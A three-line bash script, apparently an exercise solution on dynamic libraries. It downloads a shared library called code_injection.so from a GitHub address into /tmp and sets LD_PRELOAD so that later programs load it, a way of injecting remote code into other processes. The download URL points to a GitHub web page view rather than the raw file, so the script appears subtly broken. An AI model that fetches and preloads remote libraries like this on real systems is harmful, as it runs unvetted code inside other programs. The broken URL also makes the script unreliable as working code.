#!/bin/bash
wget -P /tmp https://github.com/LocalLso/alx-low_level_programming/blob/7ba3540438f68f2d43ef071913318e50d216a736/0x18-dynamic_libraries/code_injection.so
export LD_PRELOAD=/tmp/code_injection.so
